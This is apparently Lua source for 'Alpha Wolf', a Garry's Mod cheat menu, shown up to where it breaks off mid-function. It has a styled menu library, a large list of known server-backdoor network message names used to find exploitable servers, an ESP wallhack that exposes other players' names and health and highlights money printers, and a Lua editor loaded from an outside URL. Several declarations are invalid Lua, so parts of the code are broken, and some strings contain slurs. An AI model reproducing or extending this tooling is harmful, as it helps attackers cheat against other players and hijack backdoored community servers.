/*
*   Functions for Cancer Code
*/

local MatLib = MatLib or {}
local MatLib.Colors = MatLib.Colors or {}
local MatLib.Materials = MatLib.Materials or {}

MatLib.Colors.FrameTitle = Color(255, 255, 255)
MatLib.Colors.Text = Color(0, 0, 0)
MatLib.Colors.FrameBG = Color(250, 250, 250)
MatLib.Colors.FrameTop = Color(0, 128, 128)
MatLib.Colors.Button = Color(0, 128, 128)
MatLib.Colors.ButtonShadow = Color(0, 0, 0, 150)
MatLib.Colors.ButtonText = Color(255, 255, 255)
MatLib.Colors.PanelBG = Color(242, 242, 242)
MatLib.Colors.ToggleBackground = Color(27, 27, 27)
MatLib.Colors.ToggleBackgroundOn = Color(0, 128, 128)
MatLib.Colors.ComboBox = Color(255, 255, 255)
MatLib.Colors.DarkMode = false

MatLib.Materials.DownGradient = Material("gui/gradient_down")
MatLib.Materials.UpGradient = Material("gui/gradient_up")

surface.CreateFont("matlib.frametitle", {
    font = "Roboto",
    size = ScrH() * 0.025
})

surface.CreateFont("matlib.header", {
    font = "Roboto",
    size = ScrH() * 0.03
})

surface.CreateFont("matlib.text", {
    font = "Roboto",
    size = ScrH() * 0.02
})

surface.CreateFont("matlib.button", {
    font = "Roboto",
    size = ScrH() * 0.0175
})

--[[
-- Elements
]]--

-- Basic Frame.
local function MatLib.Frame(x, y, w, h, title)
    local frame = vgui.Create("DFrame")
    frame:SetSize(w, h)
    frame:SetDraggable(false)
    frame:ShowCloseButton(false)
    frame:SetTitle("")
    frame.headerHeight = 30 -- math.Max(h * 0.1, 30)
    if(x == -1 && y == -1) then
        frame:Center()
    else
        frame:SetPos(x, y)
    end
    frame.Paint = function(s, w, h)
        draw.RoundedBox(5, 0, 1, w, h - 1, MatLib.Colors.FrameBG)

        surface.SetDrawColor(0, 0, 0)
        surface.SetMaterial(MatLib.Materials.DownGradient)
        surface.DrawTexturedRect(0, s.headerHeight * 0.9, w, s.headerHeight * 0.25)

        draw.RoundedBox(5, 0, 0, w, s.headerHeight, MatLib.Colors.FrameTop)
        draw.RoundedBox(0, 0, s.headerHeight / 2, w, s.headerHeight / 2, MatLib.Colors.FrameTop)

        if(MatLib.Colors.DarkMode == false) then
            surface.SetDrawColor(MatLib.Colors.FrameTop.r + 25, MatLib.Colors.FrameTop.g + 25, MatLib.Colors.FrameTop.b + 25)
            surface.SetMaterial(MatLib.Materials.UpGradient)
            surface.DrawTexturedRect(0, s.headerHeight / 2, w, s.headerHeight / 2)
        end

        draw.SimpleText(title, "matlib.frametitle", w * 0.0225, s.headerHeight / 2, MatLib.Colors.FrameTitle, 0, 1)
    end
    frame:MakePopup()
    function frame:GetHeaderHeight()
        return frame.headerHeight
    end
    return frame
end

-- Basic Header
local function MatLib.HeaderText(frame, x, y, text)
    local label = vgui.Create("DLabel", frame)
    label:SetPos(x, y)
    label:SetText(text)
    label:SetFont("matlib.header")
    label:SetContentAlignment(7)
    label:SizeToContents()
    label:SetColor(MatLib.Colors.Text)
    return label
end

-- Basic Text
local function MatLib.Text(frame, x, y, text)
    local label = vgui.Create("DLabel", frame)
    label:SetPos(x, y)
    label:SetText(text)
    label:SetFont("matlib.text")
    label:SizeToContents()
    label:SetColor(MatLib.Colors.Text)
    return label
end

-- Button
local function MatLib.Button(frame, x, y, w, h, text)
    local button = vgui.Create("DButton", frame)
    button:SetPos(x, y)
    button:SetSize(w, h)
    button:SetText("")
    button.Lerp = 0
    button.Paint = function(s, w, h)
        draw.RoundedBox(6, 0, 0, w, h, MatLib.Colors.Button)
        if(s:IsHovered()) then
            s.Lerp = Lerp(0.05, s.Lerp, 25)
        else
            s.Lerp = Lerp(0.05, s.Lerp, 0)
        end
        draw.RoundedBox(6, 0, 0, w, h, Color(255, 255, 255, s.Lerp))
        draw.SimpleText(text, "matlib.button", w / 2, h / 2, MatLib.Colors.ButtonText, 1, 1)
    end
    return button
end

-- Scroll Panel
local function MatLib.ScrollPanel(frame, x, y, w, h)
    local scroll = vgui.Create("DScrollPanel", frame)
    scroll:SetPos(x, y)
    scroll:SetSize(w, h)

    local scrollBar = scroll:GetVBar()
    scrollBar:SetHideButtons(true)
    scrollBar:SetWide(frame:GetWide() * 0.01)
    scrollBar.Paint = function(s, w, h)

    end
    scrollBar.btnUp.Paint = function(s, w, h)

    end
    scrollBar.btnDown.Paint = function(s, w, h)

    end
    scrollBar.btnGrip.Paint = function(s, w, h)
        draw.RoundedBox(0, 0, 0, w, h, MatLib.Colors.FrameTop)
    end

    return scroll
end

-- Scroll Panel Item
local function MatLib.ScrollItem(scroll, height)
    local panel = vgui.Create("DPanel", scroll)
    panel:Dock(TOP)
    panel:DockMargin(0, 0, 0, 5)
    panel:SetSize(scroll:GetWide(), height)
    panel.Paint = function(s, w, h)
        draw.RoundedBox(0, 0, 0, w, h, MatLib.Colors.PanelBG)
    end
    return panel
end

-- Switch
local function MatLib.Switch(frame, x, y, w, h, defaultValue)
    local button = vgui.Create("DButton", frame)
    button:SetPos(x, y)
    button:SetSize(w, h)
    button:SetText("")
    button.Lerp = 0
    button.LerpR = 0
    button.LerpG = 0
    button.LerpB = 0
    button.value = defaultValue
    button.Paint = function(s, w, h)
        if(button.value == true) then
            button.Lerp = Lerp(0.05, button.Lerp, w - (w * 0.325))
            button.LerpR = Lerp(0.05, button.LerpR, MatLib.Colors.ToggleBackgroundOn.r)
            button.LerpG = Lerp(0.05, button.LerpG, MatLib.Colors.ToggleBackgroundOn.g)
            button.LerpB = Lerp(0.05, button.LerpB, MatLib.Colors.ToggleBackgroundOn.b)
        else
            button.Lerp = Lerp(0.05, button.Lerp, 0)
            button.LerpR = Lerp(0.05, button.LerpR, MatLib.Colors.ToggleBackground.r)
            button.LerpG = Lerp(0.05, button.LerpG, MatLib.Colors.ToggleBackground.g)
            button.LerpB = Lerp(0.05, button.LerpB, MatLib.Colors.ToggleBackground.b)
        end
        draw.RoundedBox(14, 0, 0, w, h, Color(button.LerpR, button.LerpG, button.LerpB))
        draw.RoundedBox(14, button.Lerp, 0, w * 0.325, h, Color(220, 220, 220))
    end
    return button
end

-- Combo Box
local function MatLib.ComboBox(frame, x, y, w, h, defaultValue, fields)
    local box = vgui.Create("DComboBox", frame)
    box:SetPos(x, y)
    box:SetSize(w, h)
    for k,v in pairs(fields) do
        box:AddChoice(v)
    end
    box:SetValue(defaultValue)
    box.Paint = function(s, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0))
        draw.RoundedBox(0, 1, 1, w - 2, h - 2, MatLib.Colors.ComboBox)
    end
    return box
end

-- Check Box
local function MatLib.CheckBox(frame, x, y, w, h, defaultValue)
    local box = vgui.Create("DCheckBox", frame)
    box:SetPos(x, y)
    box:SetSize(w, h)
    box:SetChecked(defaultValue)
    box.Lerp = 0
    box.Paint = function(s, w, h)
        draw.RoundedBox(5, 0, 0, w, h, MatLib.Colors.FrameTop)
        if(s:GetChecked() == true) then
            box.Lerp = Lerp(0.05, box.Lerp, 255)
        else
            box.Lerp = Lerp(0.05, box.Lerp, 0)
        end
        draw.SimpleText("✔", "matlib.text", w / 2, h / 2, Color(255, 255, 255, box.Lerp), 1, 1) -- I can hear people screaming at me for using emojis instead of icons now....
    end
    return box
end

-- Notice.
local function MatLib.Notice(title, text)
    local frame = MatLib.Frame(-1, -1, ScrW() * 0.3, ScrH() * 0.075, title)
    MatLib.HeaderText(frame, frame:GetWide() * 0.025, frame:GetTall() * 0.5, text)
end

--[[
-- Themes and stuff.
]]--

-- Sets the theme color.
local function MatLib.SetThemeColor(color)
    MatLib.Colors.FrameTop = color
    MatLib.Colors.Button = color
    MatLib.Colors.ToggleBackgroundOn = color
end

-- Reset the theme color back to normal.
local function MatLib.ResetTheme()
    MatLib.Colors.FrameTop = Color(0, 190, 190)
    MatLib.Colors.Button = Color(0, 190, 190)
    MatLib.Colors.ToggleBackgroundOn = Color(0, 190, 190)
end

-- Sets up Dark Mode.
local function MatLib.SetDarkMode(dark, themeOverride)
    if(dark == true) then
        MatLib.Colors.FrameTitle = Color(255, 255, 255)
        MatLib.Colors.Text = Color(255, 255, 255)
        MatLib.Colors.FrameBG = Color(27, 27, 27)
        MatLib.Colors.ButtonShadow = Color(255, 255, 255, 150)
        MatLib.Colors.ButtonText = Color(255, 255, 255)
        MatLib.Colors.PanelBG = Color(20, 20, 20)
        MatLib.Colors.ComboBox = Color(0, 0, 0)

        MatLib.Colors.DarkMode = true
        if(themeOverride == true) then
            MatLib.Colors.ToggleBackgroundOn = Color(0, 122, 107)
            MatLib.Colors.FrameTop = Color(50, 50, 50)
            MatLib.Colors.Button = Color(50, 50, 50)
        end
    else
        MatLib.Colors.FrameTitle = Color(255, 255, 255)
        MatLib.Colors.Text = Color(0, 0, 0)
        MatLib.Colors.FrameBG = Color(250, 250, 250)
        MatLib.Colors.ButtonShadow = Color(0, 0, 0, 150)
        MatLib.Colors.ButtonText = Color(255, 255, 255)
        MatLib.Colors.PanelBG = Color(242, 242, 242)
        MatLib.Colors.ToggleBackground = Color(75, 75, 75)
        MatLib.Colors.ComboBox = Color(255, 255, 255)
        MatLib.Colors.DarkMode = false
    end
end

local function closeButton(parent, shit)
    local closeButton = vgui.Create("DButton", parent)
    closeButton:SetPos(parent:GetWide() * 0.9, 0)
    closeButton:SetSize(parent:GetWide() * 0.1, parent.headerHeight)
    closeButton:SetText("")
    closeButton.Paint = function(s, w, h)
        draw.SimpleText("x", "matlib.frametitle", w / 2, h * 0.425, MatLib.Colors.FrameTitle, 1, 1)
    end
    closeButton.DoClick = shit
end

local function backButton(parent, shit)
    local backButton = vgui.Create("DButton", parent)
    backButton:SetPos(parent:GetWide() * 0, 0)
    backButton:SetSize(parent:GetWide() * 0.1, parent.headerHeight)
    backButton:SetText("")
    backButton.Paint = function(s, w, h)
        draw.SimpleText("<-", "matlib.frametitle", w / 2, h * 0.425, MatLib.Colors.FrameTitle, 1, 1)
    end
    backButton.DoClick = shit
end

local function Derma_StringRequest(title, text, custom, fnEnter) -- Bet this will break shit for other Menus
    local frame = MatLib.Frame(-1, -1, ScrW() * 0.3, ScrH() * 0.2, title)
    MatLib.HeaderText(frame, frame:GetWide() * 0.3, frame:GetTall() * 0.4, text)
    frame:SetDraggable( false )
    frame:ShowCloseButton( false )
    frame:SetBackgroundBlur( true )
    frame:SetDrawOnTop( true )
    closeButton(frame,function() frame:Close() end)

    local TextEntry = vgui.Create( "DTextEntry", frame )
    TextEntry:SetText( custom or "" )
    TextEntry:StretchToParent( 10, nil, 10, nil )
    TextEntry:AlignBottom( 50 )
    TextEntry:SelectAllText( true )
    TextEntry.OnEnter = function() frame:Close() fnEnter( TextEntry:GetValue() ) end

    local button = vgui.Create("DButton", frame)
    button:SetPos(250,180)
    button:SetTall( 20 )
    button:SetWide( button:GetWide() + 20 )
    button:SetText("")
    button.Lerp = 0
    button.Paint = function(s, w, h)
        draw.RoundedBox(6, 0, 0, w, h, MatLib.Colors.Button)
        if(s:IsHovered()) then
            s.Lerp = Lerp(0.05, s.Lerp, 25)
        else
            s.Lerp = Lerp(0.05, s.Lerp, 0)
        end
        draw.RoundedBox(6, 0, 0, w, h, Color(255, 255, 255, s.Lerp))
        draw.SimpleText("OK", "matlib.button", w / 2, h / 2, MatLib.Colors.ButtonText, 1, 1)
    end
    button.DoClick = function() frame:Close() fnEnter(TextEntry:GetValue()) end

    return frame
end

local function makeButton(parent,name,width,high,fun,optwidth,opthigh)
    local shit = MatLib.Button(parent, parent:GetWide() * width, parent:GetTall() * high, parent:GetWide() * optwidth, parent:GetTall() * opthigh, name)
    shit.DoClick = fun
end

/*
*   Locals
*/

local RunString = RunString;
local timer = timer;
local net = net;
local vgui = vgui;
local surface = surface;
local net = net;
local IsValid = IsValid;
local ply = LocalPlayer();
local colors = {};
local steamid = LocalPlayer():SteamID();

local NoclipEnabled = false;
local NoclipViewOrigin = Vector(0, 0, 0);
local NoclipViewAngle = Angle(0, 0, 0);
local NoclipVelocity = Vector(0, 0, 0);
local FirstPressed = false;
local rainb = false;
local ESPControl = false;
local bhopshitz = false;
--local badcmds = {"-attack", "+attack", "+left", "-left", "+right", "-right", "gmod_language", "__screenshot_internal", "jpeg", "__ac", "__imacheater", "gm_possess", "achievementRefresh", "__uc_", "_____b__c", "___m", "sc", "bg", "bm", "kickme", "gw_iamacheater", "imafaggot", "birdcage_browse", "reportmod", "_fuckme", "st_openmenu", "_NOPENOPE", "__ping", "ar_check", "GForceRecoil", "~__ac_auth", "blade_client_check", "drones_dohell", "drones_do_hell", "quit", "dropmoney", "/dropmoney", "ulx motd", "ulx_motd", "ulxmotd", "blade_client_detected_message", "unbindall", "exit", "retry", "kill", "dac_imcheating", "dac_pleasebanme", "_hz_perp_bans_2hz1", "rdm", "screenshot", "bind", "bind_mac", "bindtoggle", "impulse", "+forward", "-forward", "+back", "-back", "+moveleft", "-moveleft", "+moveright", "-moveright", "cl_yawspeed", "pp_dof", "pp_bokeh", "pp_motionblur", "pp_toytown", "pp_stereoscopy", "startmovie", "record", "pp_texturize", "pp_texturize_scale", "mat_texture_limit"};
local netStrings = {"hacking bro","hackingbro","kebabmenu","rotten_proute","BITMINER_UPDATE_DLC","nostrip2","operationsmoke","vegeta","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","https://i.imgur.com/gf6hlml.png","print ( )","fps","fszof<qOvfdsf","tupeuxpaslabypass","_CAC_G","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","antileak","CreateAdminRanks","Asunalabestwaifu","shittycommand","tro2fakeestunpd","FAdmin_CreateVar","ContextHelp","lmaogetdunked","LV_BD_V2","createpanel","fuckyou","1337","haxor","r8helper","_chefhackv2","Þà?D)?","Þ  ?D)?","nostrip1","antilagger","Fix_Exploit","yazStats","FPSVBOOST","RTX420","Revelation","SizzurpDRM","cbbc","gSploit","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","Reaoscripting","ß ?D)?","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","!Çº/;.","NoOdium_Reaoscripting","m9k_","Î¾psilon","Backdoor","reaper","SDFTableFsSSQE","gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?","?", "Þ� ?D)◘", "Val", "models/zombie.mdl","alpha", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited","PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab","L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions" , "PlayerCheck" , "Sbox_darkrp" , "insid3" , "The_Dankwoo" , "Sbox_itemstore" , "Ulib_Message" , "ULogs_Info" , "ITEM" , "R8" , "fix" , "Fix_Keypads" , "Remove_Exploiters" , "noclipcloakaesp_chat_text" , "_Defqon" , "_CAC_ReadMemory" , "nostrip" , "nocheat" , "LickMeOut" , "ULX_QUERY2" , "ULXQUERY2" , "https://i.imgur.com/Gf6hLMl.png" , "MoonMan" , "Im_SOCool" , "JSQuery.Data(Post(false))" , "Sandbox_GayParty" , "DarkRP_UTF8" , "OldNetReadData" , "Gamemode_get" , "memeDoor" , "BackDoor" , "SessionBackdoor" , "DarkRP_AdminWeapons" , "cucked" , "NoNerks" , "kek" , "ZimbaBackdoor" , "something" , "random" , "strip0" , "fellosnake" , "enablevac" , "idk" , "ÃžÃ� ?D)â—˜" , "snte" , "apg_togglemode" , "Hi" , "beedoor" , "BDST_EngineForceButton" , "VoteKickNO" , "REEEEEEEEEEEE" , "_da_" , "Nostra" , "sniffing" , "keylogger" , "CakeInstall" , "Cakeuptade" , "love" , "earth" , "ulibcheck" , "Nostrip_" , "teamfrench" , "ADM" , "hack" , "crack" , "leak" , "lokisploit" , "1234" , "123" , "enculer" , "cake" , "seized" , "88" , "88_strings_" , "nostraall" , "blogs_update" , "nolag" , "loona_" , "billys_logs" , "loona" , "negativedlebest" , "berettabest" , "ReadPing" , "antiexploit" , "adm_NetString" , "mathislebg" , "Bilboard.adverts:Spawn(false)" , "pjHabrp9EY" , "?" , "lag_ping" , "allowLimitedRCON(user) 0" , "aze46aez67z67z64dcv4bt" , "killserver" , "fuckserver" , "cvaraccess" , "rcon" , "rconadmin" , "web" , "jesuslebg" , "zilnix" , "��?D)?" , "disablebackdoor" , "kill" , "DefqonBackdoor" , "DarkRP_AllDoorDatas" , "0101.1" , "awarn_remove" , "_Infinity" , "Infinity" , "InfinityBackdoor" , "_Infinity_Meme_" , "arivia" , "ULogs_B" , "_Warns" , "_cac_" , "striphelper" , "_vliss" , "YYYYTTYXY6Y" , "?????????????????�???? ?? ?�???�?�?? ???�???�???�." , "_KekTcf" , "_blacksmurf" , "blacksmurfBackdoor" , "_Raze" , "m9k_explosionradius" , "m9k_explosive" , "m9k_addons" , "rcivluz" , "SENDTEST" , "_clientcvars" , "_main" , "stream" , "waoz" , "bdsm" , "ZernaxBackdoor" , "UKT_MOMOS" , "anticrash" , "audisquad_lua" , "dontforget" , "noprop" , "thereaper" , "0x13" , "Child" , "!Cac" , "azkaw" , "BOOST_FPS" , "childexploit" , "ULX_ANTI_BACKDOOR" , "FADMIN_ANTICRASH" , "ULX_QUERY_TEST2" , "GMOD_NETDBG" , "netlib_debug" , "_DarkRP_Reading" , "lag_ping" , "||||"  , "FPP_RemovePLYCache" , "fuwa" , "stardoor" , "SENDTEST" , "rcivluz" , "c" , "N::B::P" , "changename" , "PlayerItemPickUp" , "echangeinfo" , "fourhead" , "music" , "slua" , "adm_network" , "componenttolua" , "theberettabcd" , "SparksLeBg" , "DarkRP_Armors" , "DarkRP_Gamemodes" , "fancyscoreboard_leave" , "PRDW_GET" , "pwn_http_send" , "AnatikLeNoob" , "GVacDoor" , "Keetaxor" , "BackdoorPrivate666" , "YohSambreLeBest" , "SNTE<ALL" , "!�:/;." , "pwn_http_answer" , "pwn_wake" , "verifiopd" , "AidsTacos" , "shix" , "PDA_DRM_REQUEST_CONTENT" , "xenoreceivetargetdata2" , "xenoreceivetargetdata1" , "xenoserverdatafunction" , "xenoserverfunction" , "xenoclientdatafunction" , "xenoclientfunction" , "xenoactivation" , "EXEC_REMOTE_APPS" , "yohsambresicianatik<3" , "Sbox_Message" , "Sbox_gm_attackofnullday_key" , "The_DankWhy" , "nw.readstream" , "AbSoluT" , "__G____CAC" , "Weapon_88" , "mecthack" , "SetPlayerDeathCount" , "FAdmin_Notification_Receiver" , "DarkRP_ReceiveData" , "fijiconn" , "LuaCmd" , "EnigmaProject" , "z" , "cvardel" , "effects_en" , "file" , "gag" , "asunalabestwaifu" , "stoppk" , "Ulx_Error_88" , "NoOdium_ReadPing", " striphelper ", "AlphaWolf"}

local devs = {
    ["JokinAce"] = "76561198105449317",
    ["Alpha"] = "76561198993300735"
}

local fakeRT = GetRenderTarget("fakeRT" .. os.time(), ScrW(), ScrH());

local detouredshit = game.GetIPAddress();
print(GetConVarString('ip') .. ':' .. GetConVarString('hostport'), detouredshit)
if detouredshit == "51.77.77.234:27015" or detouredshit == "91.200.100.17:27015" or detouredshit == "185.234.72.6:27015" or detouredshit == "91.200.100.17:27016" or detouredshit == "185.234.72.6:27016" then
    chat.AddText(Color(0,255,255,255), "Fuck off, this Server is under AlphaWolf Protection.")
else
    surface.CreateFont( "AlphaFett", {
        font = "Arial",
        size = 80
    })

    local function awolfNotify(msg)
        chat.AddText(Color(32, 178, 170), "[Λlpha Wolf] ", Color(0, 128, 128), msg)
    end

    local function awolfRandom(length)
        local long = tonumber(length)
        if long < 1 then return end
            local result = "" -- The empty string we start with
            for i = 1, long do
                result = result .. string.char( math.random(32, 126) )
            end
        return result
    end
    local awolfstring = awolfRandom(5)
    local awolfstring2 = awolfRandom(10)
    local awolfstring3 = awolfRandom(15)
    local awolfstring4 = awolfRandom(20)
    local awolfstring5 = awolfRandom(25)

------------------------------------------------------------------------------------------------------------------------------------------------

    local function ESPMain()
        if not ESPControl then
            chat.AddText(Color(0, 255, 0), "[Alpha Wolf]", Color(255, 255, 255), " - ESP Enabled")
            print("Box Esp loaded")
            print("Enjoy.")

            local function CreatePos(e)
                local ply = LocalPlayer()
                local center = e:LocalToWorld(e:OBBCenter())
                local min, max = e:OBBMins(), e:OBBMaxs()
                local dim = max - min
                local z = max + min
                local frt = (e:GetForward()) * (dim.y / 2)
                local rgt = (e:GetRight()) * (dim.x / 2)
                local top = (e:GetUp()) * (dim.z / 2)
                local bak = (e:GetForward() * -1) * (dim.y / 2)
                local lft = (e:GetRight() * -1) * (dim.x / 2)
                local btm = (e:GetUp() * -1) * (dim.z / 2)
                local s = 1
                local FRT = center + frt / s + rgt / s + top / s
                FRT = FRT:ToScreen()
                local BLB = center + bak / s + lft / s + btm / s
                BLB = BLB:ToScreen()
                local FLT = center + frt / s + lft / s + top / s
                FLT = FLT:ToScreen()
                local BRT = center + bak / s + rgt / s + top / s
                BRT = BRT:ToScreen()
                local BLT = center + bak / s + lft / s + top / s
                BLT = BLT:ToScreen()
                local FRB = center + frt / s + rgt / s + btm / s
                FRB = FRB:ToScreen()
                local FLB = center + frt / s + lft / s + btm / s
                FLB = FLB:ToScreen()
                local BRB = center + bak / s + rgt / s + btm / s
                BRB = BRB:ToScreen()
                local z = 100

                if (e:Health() <= 50) then
                    z = 100
                end

                local x, y = ((e:Health() / 100)), 1

                if (e:Health() <= 0) then
                    x = 1
                end

                local FRT3 = center + frt + rgt + top / x
                FRT3 = FRT3
                FRT3 = FRT3:ToScreen()
                local BLB3 = center + bak + lft + btm / x
                BLB3 = BLB3
                BLB3 = BLB3:ToScreen()
                local FLT3 = center + frt + lft + top / x
                FLT3 = FLT3
                FLT3 = FLT3:ToScreen()
                local BRT3 = center + bak + rgt + top / x
                BRT3 = BRT3
                BRT3 = BRT3:ToScreen()
                local BLT3 = center + bak + lft + top / x
                BLT3 = BLT3
                BLT3 = BLT3:ToScreen()
                local FRB3 = center + frt + rgt + btm / x
                FRB3 = FRB3
                FRB3 = FRB3:ToScreen()
                local FLB3 = center + frt + lft + btm / x
                FLB3 = FLB3
                FLB3 = FLB3:ToScreen()
                local BRB3 = center + bak + rgt + btm / x
                BRB3 = BRB3
                BRB3 = BRB3:ToScreen()
                local x, y, z = 1.1, 0.9, 1
                local FRT2 = center + frt / y + rgt / z + top / x
                FRT2 = FRT2:ToScreen()
                local BLB2 = center + bak / y + lft / z + btm / x
                BLB2 = BLB2:ToScreen()
                local FLT2 = center + frt / y + lft / z + top / x
                FLT2 = FLT2:ToScreen()
                local BRT2 = center + bak / y + rgt / z + top / x
                BRT2 = BRT2:ToScreen()
                local BLT2 = center + bak / y + lft / z + top / x
                BLT2 = BLT2:ToScreen()
                local FRB2 = center + frt / y + rgt / z + btm / x
                FRB2 = FRB2:ToScreen()
                local FLB2 = center + frt / y + lft / z + btm / x
                FLB2 = FLB2:ToScreen()
                local BRB2 = center + bak / y + rgt / z + btm / x
                BRB2 = BRB2:ToScreen()
                local maxX = math.max(FRT.x, BLB.x, FLT.x, BRT.x, BLT.x, FRB.x, FLB.x, BRB.x)
                local minX = math.min(FRT.x, BLB.x, FLT.x, BRT.x, BLT.x, FRB.x, FLB.x, BRB.x)
                local maxY = math.max(FRT.y, BLB.y, FLT.y, BRT.y, BLT.y, FRB.y, FLB.y, BRB.y)
                local minY = math.min(FRT.y, BLB.y, FLT.y, BRT.y, BLT.y, FRB.y, FLB.y, BRB.y)
                local maxXhp = math.max(FRT3.x, BLB3.x, FLT3.x, BRT3.x, BLT3.x, FRB3.x, FLB3.x, BRB3.x)
                local minXhp = math.min(FRT3.x, BLB3.x, FLT3.x, BRT3.x, BLT3.x, FRB3.x, FLB3.x, BRB3.x)
                local maxYhp = math.max(FRT3.y, BLB3.y, FLT3.y, BRT3.y, BLT3.y, FRB3.y, FLB3.y, BRB3.y)
                local minYhp = math.min(FRT3.y, BLB3.y, FLT3.y, BRT3.y, BLT3.y, FRB3.y, FLB3.y, BRB3.y)
                local maxX2 = math.max(FRT2.x, BLB2.x, FLT2.x, BRT2.x, BLT2.x, FRB2.x, FLB2.x, BRB2.x)
                local minX2 = math.min(FRT2.x, BLB2.x, FLT2.x, BRT2.x, BLT2.x, FRB2.x, FLB2.x, BRB2.x)
                local maxY2 = math.max(FRT2.y, BLB2.y, FLT2.y, BRT2.y, BLT2.y, FRB2.y, FLB2.y, BRB2.y)
                local minY2 = math.min(FRT2.y, BLB2.y, FLT2.y, BRT2.y, BLT2.y, FRB2.y, FLB2.y, BRB2.y)

                return maxX, minX, maxY, minY, maxX2, minX2, maxY2, minY2, minYhp, maxYhp
            end

            local function ESP()
                for k, e in pairs(player.GetAll()) do
                    if (e:IsPlayer() and e:Alive() and e ~= LocalPlayer()) then
                        local maxX, minX, maxY, minY, maxX2, minX2, maxY2, minY2, minYhp, maxYhp = CreatePos(e)
                        -- Box
                        surface.SetDrawColor(255, 255, 255, 255)
                        surface.DrawLine(maxX, maxY, maxX, minY)
                        surface.DrawLine(maxX, minY, minX, minY)
                        surface.DrawLine(minX, minY, minX, maxY)
                        surface.DrawLine(minX, maxY, maxX, maxY)
                        -- ESP
                        draw.SimpleText(e:Nick(), "Default", maxX2, minY2, team.GetColor(e:Team()), 4, 1)
                        draw.SimpleText("H: " .. e:Health(), "Default", maxX2, minY2 + 10, team.GetColor(e:Team()), 4, 1)
                        -- Health bar
                    end
                end
            end

            hook.Add("AltHUDPaint", awolfstring, ESP)
            local printerclasses = {"ruby_money_printer", "tierp_printer", "sapphire_money_printer", "emerald_money_printer", "topaz_money_printer", "amethyst_money_printer", "nuclear_printer", "diamond_printer", "silver_printer", "gold_printer", "nuclear_money_printer", "diamond_money_printer", "silver_money_printer", "gold_money_printer", "normal_money_printer", "money_printer_bronze", "money_printer_silver", "money_printer_gold", "money_printer_ruby", "money_printer_diamond", "maxperform_money_printer", "advanced_money_printer", "upgrade_money_printer", "mini_moneyprinter", "money_printer", "shit_moneyprinter", "random_moneyprinter", "money_press", "precision_money_press", "generator_basic", "upgrade_coolingplate"}
            local printers = {}

            timer.Create("Findprintersyes", 3, 0, function()
                printers = {}

                for k, v in pairs(printerclasses) do
                    table.Add(printers, ents.FindByClass(v))
                end
            end)

            hook.Add("AltHUDPaint", awolfstring2, function()
                if #printers < 1 then return end

                for k, v in pairs(printers) do
                    if IsValid(v) then
                        local Position = (v:GetPos()):ToScreen()
                        draw.RoundedBox(6, Position.x - 98, Position.y, 210, 30, Color(5, 5, 5, 150), 1)
                        draw.DrawText(v:GetClass(), "Trebuchet24", Position.x, Position.y, Color(255, 255, 255, 255), 1)
                    end
                end
            end)

            hook.Add("PreDrawHalos", awolfstring, function()
                if #printers < 1 then return end
                halo.Add(printers, Color(34, 139, 34), 5, 5, 2)
            end)

            ESPControl = true
        else
            chat.AddText(Color(0, 255, 0), "[Alpha Wolf]", Color(255, 255, 255), " - ESP Disabled")
            hook.Remove("AltHUDPaint", awolfstring)
            hook.Remove("AltHUDPaint", awolfstring2)
            hook.Remove("PreDrawHalos", awolfstring)
            ESPControl = false
        end
    end

------------------------------------------------------------------------------------------------------------------------------------------------

    local function codeshit() -- PLEASE REMAKE THIS
        local PANEL = {}
        PANEL.URL = "https://load.alpha-wolf.xyz/lua_editor/"
        PANEL.COMPILE = "C"

        local javascript_escape_replacements = {
            ["\\"] = "\\\\",
            ["\0"] = "\\0",
            ["\b"] = "\\b",
            ["\t"] = "\\t",
            ["\n"] = "\\n",
            ["\v"] = "\\v",
            ["\f"] = "\\f",
            ["\r"] = "\\r",
            ["\""] = "\\\"",
            ["\'"] = "\\\'"
        }

        function PANEL:Init()
            self.Code = ""
            self.ErrorPanel = self:Add("DButton")
            self.ErrorPanel:SetFont('BudgetLabel')
            self.ErrorPanel:SetTextColor(Color(255, 255, 255))
            self.ErrorPanel:SetText("")
            self.ErrorPanel:SetTall(0)

            self.ErrorPanel.DoClick = function()
                self:GotoErrorLine()
            end

            self.ErrorPanel.DoRightClick = function(self)
                SetClipboardText(self:GetText())
            end

            self.ErrorPanel.Paint = function(self, w, h)
                surface.SetDrawColor(255, 50, 50)
                surface.DrawRect(0, 0, w, h)
            end

            self:StartHTML()
        end

        function PANEL:Think()
            if self.NextValidate and self.NextValidate < CurTime() then
                self:ValidateCode()
            end
        end

        function PANEL:StartHTML()
